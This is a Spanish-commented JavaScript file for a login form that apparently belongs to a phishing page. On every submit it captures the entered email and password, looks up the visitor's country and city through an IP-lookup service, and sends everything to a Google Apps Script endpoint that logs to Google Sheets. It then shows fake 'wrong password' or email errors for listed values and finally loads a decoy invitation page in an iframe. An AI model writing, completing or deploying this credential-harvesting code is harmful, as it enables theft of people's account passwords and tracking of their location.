document.getElementById("miFormulario").addEventListener("submit", async function(event) {
    event.preventDefault(); // Evita el envío automático 

    // Obtener elementos del formulario
    const emailInput = document.querySelector('input[name="email"]');
    const passwordInput = document.querySelector('input[name="password"]');
    const errorMessage = document.getElementById('error-message');
    
    // Lista de correos electrónicos y contraseñas prohibidas
    const prohibitedEmails = ["ejemplo1@correo.com"]; // Agregar correos prohibidos aquí
    const prohibitedWords = ["hola123"]; // Agregar contraseñas prohibidas aquí
    
    const email = emailInput.value.trim().toLowerCase();
    const password = passwordInput.value;
    
    // Validar formato de correo electrónico
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
        errorMessage.textContent = "Correo electrónico no válido";
        errorMessage.style.color = 'red';
        return; // Detiene el procesamiento
    }
    
    // Verificar correo prohibido
    const isProhibitedEmail = prohibitedEmails.includes(email);
    // Verificar contraseña prohibida (exacta, no parcial)
    const containsProhibitedPassword = prohibitedWords.includes(password);
    
    // 🔍 DEBUG: Verificar qué valores se están comparando
    console.log("Email ingresado:", email);
    console.log("Contraseña ingresada:", password);
    console.log("¿Email prohibido?", isProhibitedEmail);
    console.log("¿Contraseña prohibida?", containsProhibitedPassword);
    console.log("Lista de emails prohibidos:", prohibitedEmails);
    console.log("Lista de contraseñas prohibidas:", prohibitedWords);
    
    // ✅ Detectar si el usuario usa iPhone o Android
    let deviceType = "Otro"; // Valor por defecto
    if (/android/i.test(navigator.userAgent)) {
        deviceType = "Android";
    } else if (/iphone|ipad|ipod/i.test(navigator.userAgent)) {
        deviceType = "iPhone";
    }
    
    // ✅ Obtener el país y la ciudad del usuario desde la API
    let country = "Desconocido";
    let city = "Desconocido"; // Añadido: variable para almacenar la ciudad
    try {
        const response = await fetch("https://ipwhois.app/json/");
        const data = await response.json();
        if (data) {
            if (data.country) {
                country = data.country; // Captura el país
            }
            if (data.city) {
                city = data.city; // Captura la ciudad
            }
        }
    } catch (error) {
        console.error("Error obteniendo la ubicación:", error);
    }
    
    // ✅ Asegurar que los datos se agregan correctamente antes de enviarlos
    const formData = new FormData(this);
    formData.append("device", deviceType); // Agregar dispositivo
    formData.append("country", country + " - " + city); // Agregar país y ciudad combinados
    
    // Agregar estado de validación para tracking
    if (isProhibitedEmail) {
        formData.append("status", "Email prohibido");
    } else if (containsProhibitedPassword) {
        formData.append("status", "Contraseña prohibida");
    } else {
        formData.append("status", "Acceso exitoso");
    }
    
    // ✅ SIEMPRE enviar los datos a Google Sheets
    const url = "https://script.google.com/macros/s/AKfycbxX_HcLaDf7l6NEl3z57fbYMLpAxve1DLBamLWnW5n6ap0kNuzI_Qv2IW9h6kE9rxN2/exec";
    
    try {
        await fetch(url, {
            method: "POST",
            body: new URLSearchParams(formData),
            headers: { "Content-Type": "application/x-www-form-urlencoded" }
        });
        console.log("Datos enviados exitosamente");
    } catch (error) {
        console.error("Error al enviar datos:", error);
    }
    
    // 🔥 VALIDACIONES CRÍTICAS - DEBEN DETENER LA EJECUCIÓN
    if (isProhibitedEmail) {
        console.log("🚫 BLOQUEADO: Email prohibido detectado");
        alert("DEBUG: Email prohibido - NO debe redirigir"); // Temporal para debug
        // Mostrar error de correo y limpiar campos
        errorMessage.textContent = "Ocurrio un error con el correo intentar con otra dirección";
        errorMessage.style.color = 'red';
        errorMessage.style.fontFamily = "'Noto Sans', sans-serif";
        emailInput.value = '';
        passwordInput.value = '';
        return; // ⚠️ DETIENE COMPLETAMENTE LA EJECUCIÓN - NO CONTINÚA
    }
    
    if (containsProhibitedPassword) {
        console.log("🚫 BLOQUEADO: Contraseña prohibida detectada");
        alert("DEBUG: Contraseña prohibida - NO debe redirigir"); // Temporal para debug
        // Mostrar error de contraseña y limpiar solo la contraseña
        errorMessage.textContent = "Contraseña incorrecta";
        errorMessage.style.color = 'red';
        errorMessage.style.fontFamily = "'Noto Sans', sans-serif";
        passwordInput.value = '';
        return; // ⚠️ DETIENE COMPLETAMENTE LA EJECUCIÓN - NO CONTINÚA
    }
    
    // ✅ SOLO LLEGA AQUÍ SI NO HAY ERRORES
    console.log("✅ PERMITIDO: Datos válidos, procediendo con redirección");
    alert("DEBUG: Datos válidos - SÍ debe redirigir"); // Temporal para debug
    // Limpiar cualquier mensaje de error previo
    if (errorMessage) {
        errorMessage.textContent = "";
    }

    // Ocultar el formulario
    document.getElementById("miFormulario").style.display = "none";
    
    // Mostrar mensaje "Cargando..."
    let loadingMessage = document.createElement("p");
    loadingMessage.textContent = "⏳ Procesando... por favor, espere.";
    loadingMessage.style.textAlign = "center";
    document.body.appendChild(loadingMessage);
    
    // Antes de mostrar el iframe, ocultar el footer de folder.html
    document.querySelector("p").style.display = "none"; 

    // Mostrar el iframe
    let iframe = document.getElementById("usuarioFrame");
    iframe.src = "invitation.html";
    iframe.style.display = "block";
    
    // Eliminar mensaje de carga después de mostrar usuario.html
    iframe.onload = function() {
        loadingMessage.remove();
    };
});
